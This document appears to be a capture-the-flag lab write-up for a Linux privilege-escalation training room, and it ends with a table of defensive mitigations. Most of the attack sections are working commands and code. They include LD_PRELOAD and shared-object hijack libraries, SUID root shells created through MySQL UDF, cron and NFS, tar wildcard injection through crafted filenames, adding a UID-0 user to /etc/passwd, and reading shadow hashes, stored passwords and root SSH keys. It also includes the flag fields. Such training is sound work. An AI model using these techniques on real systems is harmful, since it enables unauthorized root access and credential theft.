---
name: "Linux PrivEsc"
platform: THM
category: "Linux"
difficulty: "Medium"
os: "Linux"
points: 150
ip: "10.10.x.x"
date: "2026-04-24"
tools: ["LinPEAS", "SUID", "Cron", "Sudo", "NFS"]
userFlag: "THM{user_privesc_flag}"
rootFlag: "THM{root_privesc_flag}"
description: "A comprehensive guide to Linux privilege escalation. Learn to exploit SUID binaries, cron jobs, sudo misconfigurations, weak file permissions, and insecure NFS mounts to escalate from user to root."
---

## 1. Initial Access & Enumeration

**The Goal:** Connect to the machine and run automated enumeration to identify potential vectors.

### Task 1: Deploy the Vulnerable Machine

Connect using SSH with the provided low-privileged credentials:

```bash
ssh user@10.10.x.x
```

```plaintext
user@10.10.x.x's password:
Welcome to Debian GNU/Linux

user@debian:~$
```

Run basic system enumeration to understand the environment:

```bash
id
hostname
uname -a
```

```plaintext
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
debian
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
```

> **Note:** This is a Debian machine running kernel `2.6.32`. The old kernel version is significant —
> it is vulnerable to Dirty COW and other well-known kernel exploits covered later.

---

## 2. Service Exploits

**The Goal:** Exploit internal services running as root.

### Task 2: MySQL UDF Exploit

The MySQL service is running as root and allows login without a password. We abuse MySQL's
**User Defined Function (UDF)** feature to execute OS commands as the root user.

The `sys_exec` UDF is already loaded in this room's environment. In a real engagement you would
need to compile and load `raptor_udf2.so` manually.

Log in to MySQL:

```bash
mysql -u root
```

Execute the UDF to create a SUID root shell:

```sql
use mysql;
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
```

```plaintext
+---------------------------------------------------------+
| sys_exec('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+---------------------------------------------------------+
|                                                       0 |
+---------------------------------------------------------+
1 row in set (0.01 sec)
```

Run the SUID shell with `-p` to preserve the elevated privileges:

```bash
/tmp/rootbash -p
```

```plaintext
rootbash-4.4# whoami
root
```

---

## 3. Weak File Permissions

**The Goal:** Abuse misconfigured permissions on critical system files (`/etc/shadow`, `/etc/passwd`).

### Task 3: Readable /etc/shadow

`/etc/shadow` stores password hashes and should only be readable by root. If world-readable,
we extract and crack the hashes offline with no interaction needed.

```bash
ls -la /etc/shadow
cat /etc/shadow
```

```plaintext
-rw-r--rw- 1 root shadow 1234 Apr 24 2026 /etc/shadow

root:$6$Tb/euwmK$OXA.FAcjODH...:18396:0:99999:7:::
user:$6$qj0x...:18396:0:99999:7:::
```

Copy the root hash to `hash.txt` and crack it:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Task 4: Writable /etc/shadow

If we can write to `/etc/shadow`, we generate a new SHA-512 hash and replace root's entry directly.

```bash
mkpasswd -m sha-512 newpassword
```

```plaintext
$6$q.hK9A1A$y7pZt/v0g8T8R4D...
```

Open `/etc/shadow` in a text editor, replace the root hash with the generated one, then:

```bash
su root
# password: newpassword
```

> **Cleanup:** Restore the original hash after the exercise to avoid breaking the machine for others.

### Task 5: Writable /etc/passwd

`/etc/passwd` being world-writable is a critical misconfiguration. We can add a new user with
UID 0 (root-equivalent) — and because `/etc/passwd` entries take precedence over `/etc/shadow`
when a password hash is present in the passwd file itself, this works even without touching shadow.

Generate a password hash:

```bash
openssl passwd newpassword
```

```plaintext
OazC9p0X.
```

Append a new root user:

```bash
echo "newroot:OazC9p0X.:0:0:root:/root:/bin/bash" >> /etc/passwd
su newroot
# password: newpassword
```

```plaintext
root@debian:~# whoami
root
```

---

## 4. Sudo Exploitation

**The Goal:** Abuse `sudo` rights granted to the user.

### Task 6: Shell Escape Sequences

Check what the current user is allowed to run with sudo:

```bash
sudo -l
```

```plaintext
User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/nmap
```

Many standard Unix programs can spawn shells when run with elevated privileges. Reference
[GTFOBins](https://gtfobins.github.io/) for a complete list. Common escapes:

```bash
# vim
sudo vim -c '!sh'

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# less — once inside, type:
sudo less /etc/passwd
# then press: !/bin/sh

# find
sudo find . -exec /bin/sh \; -quit
```

### Task 7: Sudo — Environment Variables

If `sudo -l` shows `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH` in the Defaults,
we can inject a malicious shared library that runs as root when a permitted sudo command loads it.

#### LD_PRELOAD Exploit

`LD_PRELOAD` forces a shared library to load before all others. Our malicious library's `_init()`
function runs immediately on load, before the actual program starts.

Create `preload.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile and execute with any allowed sudo command:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so apache2
```

```plaintext
root@debian:~# whoami
root
```

#### LD_LIBRARY_PATH Exploit

`LD_LIBRARY_PATH` tells the dynamic linker where to search for shared libraries. We create a
malicious library named after one the target program legitimately uses, and inject our path first.

Check which libraries a permitted binary uses:

```bash
ldd /usr/sbin/apache2
```

```plaintext
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3
libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6
```

Create `library_path.c` — name the output after one of the listed libraries:

```c
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

```plaintext
root@debian:~# whoami
root
```

---

## 5. Cron Job Abuse

**The Goal:** Exploit scheduled tasks that run as root.

### Task 8: Writable Cron Script

View the system-wide crontab:

```bash
cat /etc/crontab
```

```plaintext
* * * * * root /usr/local/bin/overwrite.sh
```

If we have write access to the script the cron job calls, we overwrite it:

```bash
ls -la /usr/local/bin/overwrite.sh
# -rwxr--rw- 1 root root — world-writable

echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /usr/local/bin/overwrite.sh
```

Wait one minute for the cron to fire, then:

```bash
/tmp/rootbash -p
```

### Task 9: Cron PATH Hijacking

If the crontab defines a custom `PATH` that includes a user-writable directory before the system
directories, we place a malicious script with the same name as the cron command in that directory.

```bash
# Crontab shows: PATH=/home/user:/usr/local/bin:/usr/bin:/bin

echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

Wait for the cron cycle, then run `/tmp/rootbash -p`.

### Task 10: Cron Wildcard Injection

If a cron job uses a wildcard (`*`) with a tool like `tar`, we create filenames that the shell
expands into command-line flags for `tar`. This is argument injection via filename expansion.

```bash
# Crontab: tar czf /tmp/backup.tar.gz /home/user/*

echo 'cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' > /home/user/runme.sh
chmod +x /home/user/runme.sh

# These filenames become tar flags when the wildcard expands
touch "/home/user/--checkpoint=1"
touch "/home/user/--checkpoint-action=exec=sh runme.sh"
```

When the cron fires, `tar` sees `--checkpoint=1 --checkpoint-action=exec=sh runme.sh` as arguments
and executes our script as root.

---

## 6. SUID & SGID Vectors

**The Goal:** Exploit binaries that run with the file owner's privileges (usually root).

Find all SUID binaries on the system:

```bash
find / -type f -perm -4000 2>/dev/null
```

```plaintext
/usr/bin/passwd
/usr/bin/exim-4.84-3
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
```

### Task 11: Known Exploits

`exim-4.84-3` is a known vulnerable version. Search for a local privilege escalation exploit:

```bash
searchsploit exim 4.84
```

```plaintext
Exim 4.84-3 - Local Privilege Escalation | linux/local/39535.sh
```

Download and run the exploit script per its instructions.

### Task 12: Shared Object Injection

An SUID binary may attempt to load a shared library from a path we control. Use `strace` to find
missing library loads:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

```plaintext
open("/home/user/.config/libcalc.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

The binary looks for `libcalc.so` in our home directory — which we control. Create `libcalc.c`:

```c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    setuid(0);
    system("/bin/bash -p");
}
```

```bash
mkdir -p /home/user/.config
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
/usr/local/bin/suid-so
```

```plaintext
root@debian:~# whoami
root
```

### Task 13: PATH Environment Variable Hijacking

If an SUID binary calls another program using a relative name (e.g., `service` instead of
`/usr/sbin/service`), we create a fake `service` binary in a directory we control, then prepend
that directory to PATH.

Create `service.c`:

```c
int main() {
    setuid(0);
    system("/bin/bash -p");
    return 0;
}
```

```bash
gcc -o service service.c
export PATH=.:$PATH
/usr/local/bin/suid-env
```

```plaintext
root@debian:~# whoami
root
```

### Task 14: Abusing Shell Features — Function Override (Bash < 4.2)

In Bash versions below 4.2, you can define a shell function with the same name as an absolute
path. SUID binaries that call that path via Bash will execute our function instead.

```bash
# Verify Bash version first
/bin/bash --version
# GNU bash, version 4.1.5

function /usr/sbin/service { cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
/tmp/rootbash -p
```

> **Note:** This technique does not work on Bash 4.2 or newer.

### Task 15: Abusing Shell Features — PS4 Debug Injection (Bash < 4.4)

In Bash below 4.4, when `SHELLOPTS=xtrace` is set, the shell evaluates `PS4` as a command for
each line of trace output. We inject our payload into PS4.

```bash
# Verify Bash version is below 4.4
/bin/bash --version

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
/tmp/rootbash -p
```

> **Note:** This technique does not work on Bash 4.4 or newer. Modern systems are not vulnerable.

---

## 7. Passwords & SSH Keys

**The Goal:** Find sensitive credentials left behind by administrators.

### Task 16: Shell History Files

Administrators sometimes accidentally type passwords directly in the terminal. These get logged:

```bash
cat ~/.bash_history
cat ~/.zsh_history 2>/dev/null
```

```plaintext
ls -al
cd /tmp
mysql -u root -p'supersecretpassword123'
rm -rf /var/log/apache2/access.log
exit
```

Try discovered passwords with `su root` or via SSH.

### Task 17: Config Files

Applications store credentials in config files — VPN configs, web app configs, database
connection strings. Search broadly:

```bash
find / -name "*.ovpn" 2>/dev/null
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null
```

```plaintext
/home/user/myvpn.ovpn
```

```bash
cat /home/user/myvpn.ovpn
```

```plaintext
auth-user-pass /etc/openvpn/auth.txt
```

```bash
cat /etc/openvpn/auth.txt
```

```plaintext
root
password123
```

```bash
su root
# password: password123
```

```plaintext
root@debian:~# whoami
root
```

### Task 18: SSH Keys

Check for unprotected private keys in home directories, backup folders, and web roots:

```bash
find / -name "id_rsa" -readable 2>/dev/null
cat /root/.ssh/id_rsa
```

```plaintext
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA0P3z...
-----END RSA PRIVATE KEY-----
```

Save the key locally, fix permissions, and SSH as root:

```bash
chmod 600 stolen_key
ssh -i stolen_key root@10.10.x.x
```

---

## 8. NFS Misconfigurations

**The Goal:** Exploit `no_root_squash` on exported NFS shares.

### Task 19: NFS Root Squash Bypass

Check the NFS export configuration on the target:

```bash
cat /etc/exports
```

```plaintext
/home/user/share  *(rw,sync,insecure,all_squash)
/tmp              *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

By default, NFS maps the remote root user to `nobody` (`root_squash`). When `no_root_squash` is
set, remote root keeps its root privileges on the share — so we can create SUID binaries from our
Kali machine as root and execute them on the target.

**On your Kali machine (as root):**

```bash
mkdir /tmp/nfs
sudo mount -o rw,vers=2 10.10.x.x:/tmp /tmp/nfs
```

Create `nfs_shell.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
    return 0;
}
```

Compile and set SUID from Kali (running as root, so ownership is root):

```bash
sudo gcc -o /tmp/nfs/rootbash nfs_shell.c
sudo chmod +xs /tmp/nfs/rootbash
```

**Back on the target machine:**

```bash
/tmp/rootbash -p
```

```plaintext
rootbash-4.4# whoami
root
```

> **How it works:** Because we compiled and `chmod +s` as root on the Kali side (with
> `no_root_squash` active), the binary lands on the target with root as its owner and the SUID bit
> set. Executing it on the target triggers the SUID elevation.

---

## 9. Kernel Exploits

**The Goal:** Use a known kernel vulnerability to gain root.

### Task 20: Dirty COW (CVE-2016-5195)

The kernel version `2.6.32` is significantly outdated. Use Linux Exploit Suggester to find matches:

```bash
perl linux-exploit-suggester-2.pl
```

```plaintext
Local Kernel: 2.6.32
Searching 72 exploits...

Possible Exploits
[1] dirty_cow
    CVE-2016-5195
    Source: http://www.exploit-db.com/exploits/40839
[2] exploit_x
    CVE-2018-14665
    Source: http://www.exploit-db.com/exploits/45697
```

Compile and run the Dirty COW exploit:

```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

```plaintext
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password123
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

Done! Check /etc/passwd to see if the new user was created.
```

```bash
su firefart
# password: password123
```

```plaintext
firefart@debian:~# whoami
root
```

> **Warning:** Kernel exploits can cause system instability or kernel panics. Always treat them as
> a last resort in real engagements.

> **Cleanup:** Restore the original `/etc/passwd` after completing the task — a backup was
> automatically created at `/tmp/passwd.bak`:
> ```bash
> cp /tmp/passwd.bak /etc/passwd
> ```

---

## 10. Automated Enumeration Scripts

### Task 21: LinPEAS & LinEnum

Manual enumeration is essential for understanding *why* something is vulnerable. In real
engagements, automation saves time. The most useful tools:

| Tool | What it finds |
|---|---|
| LinPEAS | SUID/SGID, crons, sudo, NFS, passwords, kernel CVEs |
| LinEnum | Similar coverage, less output noise |
| Linux Exploit Suggester | Kernel CVE matching by version |

**Transfer LinPEAS to the target** — first start an HTTP server on Kali:

```bash
# On Kali:
cd /opt/PEASS-ng/linPEAS
python3 -m http.server 8000
```

Then on the target:

```bash
# On the target:
wget http://<YOUR_KALI_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

```plaintext
[+] SUID - Check easy privesc, exploits and write perms
[red/yellow] /usr/local/bin/suid-env
[red/yellow] /usr/local/bin/suid-so
[red/yellow] /usr/bin/exim-4.84-3
```

Red/yellow highlights in LinPEAS output indicate high-confidence findings worth investigating first.

> **Tip:** Pipe through `less -R` to preserve colors in the terminal:
> `./linpeas.sh | less -R`

---

## Mitigations (Blue Team Perspective)

| Vector | Root Cause | Fix |
|---|---|---|
| MySQL UDF | MySQL running as root with no password | Run MySQL as a dedicated low-privilege user; enforce authentication |
| Readable `/etc/shadow` | Wrong file permissions (`-rw-r--rw-`) | `chmod 640 /etc/shadow; chown root:shadow /etc/shadow` |
| Writable `/etc/passwd` | Wrong file permissions | `chmod 644 /etc/passwd` — world-readable only, not writable |
| Sudo shell escapes | Overly broad sudo rules | Only grant sudo to specific safe commands; avoid granting `vim`, `less`, `awk`, `find` |
| LD_PRELOAD via sudo | `env_keep+=LD_PRELOAD` in sudoers | Remove `env_keep` overrides; use `env_reset` (default) |
| Writable cron scripts | Cron script permissions too open | Ensure all root cron scripts are owned by root, mode `700` |
| Cron PATH hijack | Custom PATH in crontab with user-writable directory first | Always use absolute paths in crontab commands |
| SUID shared object injection | SUID binary loads libraries from user-writable paths | Audit SUID binaries with `strace`; remove unnecessary SUID bits |
| NFS `no_root_squash` | Misconfigured NFS export | Use `root_squash` (default) on all NFS shares; restrict exports by IP |
| Dirty COW (kernel) | Unpatched kernel `2.6.32` | Apply kernel updates; use `unattended-upgrades` |
| Credentials in history | Passwords typed directly in terminal | `HISTCONTROL=ignorespace` to suppress; rotate any exposed credentials |
